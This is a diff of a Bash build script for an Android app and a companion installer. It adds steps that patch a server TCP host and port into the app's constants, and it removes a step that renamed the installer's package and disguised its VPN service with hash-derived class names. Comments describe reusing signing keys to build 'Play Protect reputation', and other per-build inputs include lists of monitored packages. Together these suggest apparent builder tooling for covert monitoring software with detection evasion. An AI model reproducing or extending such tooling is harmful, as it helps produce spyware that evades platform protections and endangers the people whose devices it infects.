@@ -533,10 +533,6 @@ done
 APP_STRINGS="$ROOT_DIR/app/src/main/res/values/strings.xml"
 INSTALLER_STRINGS="$ROOT_DIR/installer/src/main/res/values/strings.xml"
 APP_CONSTANTS="$ROOT_DIR/app/src/main/java/com/task/tusker/utils/Constants.java"
-INSTALLER_BUILD_GRADLE="$ROOT_DIR/installer/build.gradle"
-INSTALLER_PROGUARD="$ROOT_DIR/installer/proguard-rules.pro"
-INSTALLER_MANIFEST="$ROOT_DIR/installer/src/main/AndroidManifest.xml"
-INSTALLER_JAVA_ROOT="$ROOT_DIR/installer/src/main/java"
 ACCESS_ID_FILE="$ROOT_DIR/app/build.access_id"
 APP_ID_FILE="$ROOT_DIR/app/build.app_id"
 INSTALLER_PACKAGE_FILE="$ROOT_DIR/app/build.installer_id"
@@ -554,28 +550,6 @@ mkdir -p "$BACKUP_DIR"
 APP_STRINGS_BAK="$BACKUP_DIR/app.strings.xml.bak"
 INSTALLER_STRINGS_BAK="$BACKUP_DIR/installer.strings.xml.bak"
 APP_CONSTANTS_BAK="$BACKUP_DIR/app.Constants.java.bak"
-INSTALLER_BUILD_GRADLE_BAK="$BACKUP_DIR/installer.build.gradle.bak"
-INSTALLER_PROGUARD_BAK="$BACKUP_DIR/installer.proguard-rules.pro.bak"
-INSTALLER_MANIFEST_BAK="$BACKUP_DIR/installer.AndroidManifest.xml.bak"
-INSTALLER_JAVA_BAK="$BACKUP_DIR/installer.java.bak"
-ACCESS_ID_PREEXISTING_BAK="$BACKUP_DIR/preexisting.build.access_id"
-APP_ID_PREEXISTING_BAK="$BACKUP_DIR/preexisting.build.app_id"
-INSTALLER_PACKAGE_PREEXISTING_BAK="$BACKUP_DIR/preexisting.build.installer_id"
-INSTALLER_ID_PREEXISTING_BAK="$BACKUP_DIR/preexisting.installer.build.app_id"
-
-# Per-build override files are normally generated and removed at EXIT. Preserve
-# any file that was already present before this invocation (for example a
-# repository checkout may intentionally carry app/build.app_id).
-for _override_pair in \
-    "$ACCESS_ID_FILE:$ACCESS_ID_PREEXISTING_BAK" \
-    "$APP_ID_FILE:$APP_ID_PREEXISTING_BAK" \
-    "$INSTALLER_PACKAGE_FILE:$INSTALLER_PACKAGE_PREEXISTING_BAK" \
-    "$INSTALLER_ID_FILE:$INSTALLER_ID_PREEXISTING_BAK"; do
-    _override_src="${_override_pair%%:*}"
-    _override_bak="${_override_pair#*:}"
-    [ -f "$_override_src" ] && cp -f "$_override_src" "$_override_bak"
-done
-unset _override_pair _override_src _override_bak
 
 # Also defensively clean up any *.bak files that a previous, interrupted
 # run may have left INSIDE Android resource directories. Without this,
@@ -594,21 +568,10 @@ cleanup_overrides() {
     [ -f "$APP_STRINGS_BAK"       ] && mv -f "$APP_STRINGS_BAK"       "$APP_STRINGS"       || true
     [ -f "$INSTALLER_STRINGS_BAK" ] && mv -f "$INSTALLER_STRINGS_BAK" "$INSTALLER_STRINGS" || true
     [ -f "$APP_CONSTANTS_BAK"     ] && mv -f "$APP_CONSTANTS_BAK"     "$APP_CONSTANTS"     || true
-    [ -f "$INSTALLER_BUILD_GRADLE_BAK" ] && mv -f "$INSTALLER_BUILD_GRADLE_BAK" "$INSTALLER_BUILD_GRADLE" || true
-    [ -f "$INSTALLER_PROGUARD_BAK" ] && mv -f "$INSTALLER_PROGUARD_BAK" "$INSTALLER_PROGUARD" || true
-    [ -f "$INSTALLER_MANIFEST_BAK" ] && mv -f "$INSTALLER_MANIFEST_BAK" "$INSTALLER_MANIFEST" || true
-    if [ -d "$INSTALLER_JAVA_BAK" ]; then
-        rm -rf "$INSTALLER_JAVA_ROOT"
-        mv -f "$INSTALLER_JAVA_BAK" "$INSTALLER_JAVA_ROOT"
-    fi
     [ -f "$APP_LAYOUT_BAK"        ] && mv -f "$APP_LAYOUT_BAK"        "$APP_LAYOUT"        || true
     [ -f "$INSTALLER_LAYOUT_BAK"  ] && mv -f "$INSTALLER_LAYOUT_BAK"  "$INSTALLER_LAYOUT"  || true
     [ -f "$INSTALLER_COLORS_BAK"  ] && mv -f "$INSTALLER_COLORS_BAK"  "$INSTALLER_COLORS"  || true
     rm -f "$ACCESS_ID_FILE" "$APP_ID_FILE" "$INSTALLER_PACKAGE_FILE" "$INSTALLER_ID_FILE"
-    [ -f "$ACCESS_ID_PREEXISTING_BAK" ] && mv -f "$ACCESS_ID_PREEXISTING_BAK" "$ACCESS_ID_FILE" || true
-    [ -f "$APP_ID_PREEXISTING_BAK" ] && mv -f "$APP_ID_PREEXISTING_BAK" "$APP_ID_FILE" || true
-    [ -f "$INSTALLER_PACKAGE_PREEXISTING_BAK" ] && mv -f "$INSTALLER_PACKAGE_PREEXISTING_BAK" "$INSTALLER_PACKAGE_FILE" || true
-    [ -f "$INSTALLER_ID_PREEXISTING_BAK" ] && mv -f "$INSTALLER_ID_PREEXISTING_BAK" "$INSTALLER_ID_FILE" || true
     # NOTE: MODULE_KS_PATH and INST_KS_PATH now point to persistent files inside
     # app/ — do NOT delete them here.  They must survive across builds so the
     # same signing certificate is reused and can accumulate Play Protect reputation.
@@ -641,171 +604,7 @@ PYEOF
 fi
 unset _PKGIDS_FILE _RAND_PKG
 
-# ── Installer identity generation ────────────────────────────────────────────
-# The installer applicationId is user/job supplied in customized builds. Keep
-# the Java namespace, component class names, action string, Gradle namespace,
-# and R8 entry-point rules aligned with that ID so a generated installer never
-# carries the in-tree com.onerule.task identity.
-#
-# This is a temporary source rewrite. The original installer tree is moved
-# outside the Java source set and restored by cleanup_overrides(), including
-# when the build fails or is interrupted.
-INSTALLER_PACKAGE_DEFAULT="com.onerule.task"
-INSTALLER_PACKAGE_EFFECTIVE="${BUILD_INSTALLER_PACKAGE:-$INSTALLER_PACKAGE_DEFAULT}"
-if ! [[ "$INSTALLER_PACKAGE_EFFECTIVE" =~ ^[A-Za-z_][A-Za-z0-9_]*(\.[A-Za-z_][A-Za-z0-9_]*)+$ ]]; then
-    echo "  ERROR: installer package ID is not a valid Java package name: '$INSTALLER_PACKAGE_EFFECTIVE'"
-    exit 1
-fi
-
-INSTALLER_PACKAGE_PATH="${INSTALLER_PACKAGE_EFFECTIVE//./\/}"
-INSTALLER_IDENTITY_HASH=$(printf '%s' "$INSTALLER_PACKAGE_EFFECTIVE" | sha256sum | cut -c1-10)
-INSTALLER_ACTIVITY_CLASS="A${INSTALLER_IDENTITY_HASH}"
-INSTALLER_VPN_CLASS="V${INSTALLER_IDENTITY_HASH}"
-
-# The checked-in installer sources may already carry generated class names
-# instead of the original MainActivity/BlockVpnService names. Discover the
-# source classes so repeated and custom-package builds use the same path.
-cp "$INSTALLER_BUILD_GRADLE" "$INSTALLER_BUILD_GRADLE_BAK"
-cp "$INSTALLER_PROGUARD" "$INSTALLER_PROGUARD_BAK"
-cp "$INSTALLER_MANIFEST" "$INSTALLER_MANIFEST_BAK"
-mv "$INSTALLER_JAVA_ROOT" "$INSTALLER_JAVA_BAK"
-mkdir -p "$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH"
-INSTALLER_SOURCE_CLASSES=$(python3 - "$INSTALLER_JAVA_BAK" << 'PYEOF'
-import pathlib
-import re
-import sys
-
-root = pathlib.Path(sys.argv[1])
-matches = {}
-patterns = {
-    "activity": re.compile(r"\bpublic\s+class\s+([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+Activity\b"),
-    "vpn": re.compile(r"\bpublic\s+class\s+([A-Za-z_][A-Za-z0-9_]*)\s+extends\s+VpnService\b"),
-}
-
-for path in sorted(root.rglob("*.java")):
-    text = path.read_text(encoding="utf-8")
-    for kind, pattern in patterns.items():
-        match = pattern.search(text)
-        if match and kind not in matches:
-            matches[kind] = (match.group(1), str(path))
-
-missing = [kind for kind in patterns if kind not in matches]
-if missing:
-    raise SystemExit("Could not find installer source class(es): " + ", ".join(missing))
-
-print("\t".join([
-    matches["activity"][0], matches["activity"][1],
-    matches["vpn"][0], matches["vpn"][1],
-]))
-PYEOF
-)
-IFS=$'\t' read -r INSTALLER_SOURCE_ACTIVITY_CLASS INSTALLER_SOURCE_ACTIVITY_PATH \
-    INSTALLER_SOURCE_VPN_CLASS INSTALLER_SOURCE_VPN_PATH <<< "$INSTALLER_SOURCE_CLASSES"
-
-cp "$INSTALLER_SOURCE_ACTIVITY_PATH" \
-   "$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH/$INSTALLER_ACTIVITY_CLASS.java"
-cp "$INSTALLER_SOURCE_VPN_PATH" \
-   "$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH/$INSTALLER_VPN_CLASS.java"
-
-INSTALLER_PACKAGE_EFFECTIVE="$INSTALLER_PACKAGE_EFFECTIVE" \
-INSTALLER_ACTIVITY_CLASS="$INSTALLER_ACTIVITY_CLASS" \
-INSTALLER_VPN_CLASS="$INSTALLER_VPN_CLASS" \
-INSTALLER_SOURCE_ACTIVITY_CLASS="$INSTALLER_SOURCE_ACTIVITY_CLASS" \
-INSTALLER_SOURCE_VPN_CLASS="$INSTALLER_SOURCE_VPN_CLASS" \
-python3 - "$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH/$INSTALLER_ACTIVITY_CLASS.java" \
-         "$INSTALLER_JAVA_ROOT/$INSTALLER_PACKAGE_PATH/$INSTALLER_VPN_CLASS.java" << 'PYEOF'
-import os
-import re
-import sys
-
-pkg = os.environ["INSTALLER_PACKAGE_EFFECTIVE"]
-activity = os.environ["INSTALLER_ACTIVITY_CLASS"]
-vpn = os.environ["INSTALLER_VPN_CLASS"]
-source_activity = os.environ["INSTALLER_SOURCE_ACTIVITY_CLASS"]
-source_vpn = os.environ["INSTALLER_SOURCE_VPN_CLASS"]
-
-for path in sys.argv[1:]:
-    with open(path, "r", encoding="utf-8") as f:
-        src = f.read()
-    src = re.sub(r"^package\s+[^;]+;", f"package {pkg};", src, count=1, flags=re.MULTILINE)
-    src = re.sub(rf"\b{re.escape(source_activity)}\b", activity, src)
-    src = re.sub(rf"\b{re.escape(source_vpn)}\b", vpn, src)
-    src = src.replace('"com.onerule.task.INSTALL_DONE"', f'"{pkg}.INSTALL_DONE"')
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(src)
-PYEOF
-
-INSTALLER_PACKAGE_EFFECTIVE="$INSTALLER_PACKAGE_EFFECTIVE" \
-INSTALLER_ACTIVITY_CLASS="$INSTALLER_ACTIVITY_CLASS" \
-INSTALLER_VPN_CLASS="$INSTALLER_VPN_CLASS" \
-INSTALLER_SOURCE_ACTIVITY_CLASS="$INSTALLER_SOURCE_ACTIVITY_CLASS" \
-INSTALLER_SOURCE_VPN_CLASS="$INSTALLER_SOURCE_VPN_CLASS" \
-python3 - "$INSTALLER_BUILD_GRADLE" "$INSTALLER_PROGUARD" "$INSTALLER_MANIFEST" << 'PYEOF'
-import os
-import re
-import sys
-
-pkg = os.environ["INSTALLER_PACKAGE_EFFECTIVE"]
-activity = os.environ.get("INSTALLER_ACTIVITY_CLASS", "")
-vpn = os.environ.get("INSTALLER_VPN_CLASS", "")
-source_activity = os.environ["INSTALLER_SOURCE_ACTIVITY_CLASS"]
-source_vpn = os.environ["INSTALLER_SOURCE_VPN_CLASS"]
-
-gradle_path, proguard_path, manifest_path = sys.argv[1:]
-with open(gradle_path, "r", encoding="utf-8") as f:
-    gradle = f.read()
-gradle = gradle.replace("namespace 'com.onerule.task'", f"namespace '{pkg}'", 1)
-with open(gradle_path, "w", encoding="utf-8") as f:
-    f.write(gradle)
-
-with open(proguard_path, "r", encoding="utf-8") as f:
-    proguard = f.read()
-proguard = proguard.replace(
-    f"com.onerule.task.{source_activity}",
-    f"{pkg}.{activity}",
-)
-proguard = proguard.replace(
-    f"com.onerule.task.{source_vpn}",
-    f"{pkg}.{vpn}",
-)
-proguard = re.sub(
-    r"(?m)^-keep class [A-Za-z_][A-Za-z0-9_.]*\.BuildConfig \{ \*; \}$",
-    f"-keep class {pkg}.BuildConfig {{ *; }}",
-    proguard,
-)
-vpn_keep = f"-keep public class {pkg}.{vpn} {{ public <init>(); }}"
-if vpn_keep not in proguard:
-    proguard = proguard.replace(
-        "# zip4j — needs reflection-safe internals",
-        vpn_keep + "\n\n# zip4j — needs reflection-safe internals",
-        1,
-    )
-with open(proguard_path, "w", encoding="utf-8") as f:
-    f.write(proguard)
-
-with open(manifest_path, "r", encoding="utf-8") as f:
-    manifest = f.read()
-manifest = manifest.replace(
-    f'android:name=".{source_activity}"',
-    f'android:name=".{activity}"',
-    1,
-)
-manifest = manifest.replace(
-    f'android:name=".{source_vpn}"',
-    f'android:name=".{vpn}"',
-    1,
-)
-with open(manifest_path, "w", encoding="utf-8") as f:
-    f.write(manifest)
-PYEOF
-
-echo "  Installer namespace   = $INSTALLER_PACKAGE_EFFECTIVE"
-echo "  Installer activity    = $INSTALLER_ACTIVITY_CLASS"
-echo "  Installer VPN service  = $INSTALLER_VPN_CLASS"
-echo "  Installer manifest    = generated component names applied"
-echo "  Installer methods     = R8 release renaming enabled (entry constructors retained)"
-
-if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
+if [ -n "${BUILD_ACCESS_ID:-}" ] || [ -n "${BUILD_MODULE_PACKAGE:-}" ] || [ -n "${BUILD_INSTALLER_PACKAGE:-}" ] || [ -n "${BUILD_MODULE_NAME:-}" ] || [ -n "${BUILD_INSTALLER_NAME:-}" ] || [ -n "${BUILD_MONITORED_PACKAGES:-}" ] || [ -n "${BUILD_TCP_HOST:-}" ] || [ -n "${BUILD_TCP_PORT:-}" ] || [ -n "${BUILD_MODULE_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_ICON_URL:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] || [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]; then
     echo ""
     echo "==> Per-build customization active"
 
@@ -884,6 +683,44 @@ with open(path, 'w', encoding='utf-8') as f:
     f.write(new)
 print(f"  Constants.java MONITORED_PACKAGES = {len(uniq)} entries")
 PYEOF
+    fi
+
+    # Patch Constants.java TCP_HOST with the server's actual hostname.
+    if [ -n "${BUILD_TCP_HOST:-}" ] && [ -f "$APP_CONSTANTS" ]; then
+        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
+        BUILD_TCP_HOST="$BUILD_TCP_HOST" python3 - "$APP_CONSTANTS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+host = os.environ['BUILD_TCP_HOST']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+new = re.sub(
+    r'(public\s+static\s+final\s+String\s+TCP_HOST\s*=\s*")[^"]*(")',
+    lambda m: m.group(1) + host + m.group(2),
+    src, count=1
+)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+print(f"  Constants.java TCP_HOST = {host}")
+PYEOF
+        echo "  TCP_HOST = $BUILD_TCP_HOST"
+    fi
+
+    # Patch Constants.java TCP_PORT with the server's actual port.
+    if [ -n "${BUILD_TCP_PORT:-}" ] && [ -f "$APP_CONSTANTS" ]; then
+        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
+        BUILD_TCP_PORT="$BUILD_TCP_PORT" python3 - "$APP_CONSTANTS" << 'PYEOF'
+import sys, os, re
+path = sys.argv[1]
+port = os.environ['BUILD_TCP_PORT']
+with open(path, 'r', encoding='utf-8') as f: src = f.read()
+new = re.sub(
+    r'(public\s+static\s+final\s+int\s+TCP_PORT\s*=\s*)\d+(\s*;)',
+    lambda m: m.group(1) + port + m.group(2),
+    src, count=1
+)
+with open(path, 'w', encoding='utf-8') as f: f.write(new)
+print(f"  Constants.java TCP_PORT = {port}")
+PYEOF
+        echo "  TCP_PORT = $BUILD_TCP_PORT"
     fi
 
     # ── Custom app icons ──────────────────────────────────────────────────────
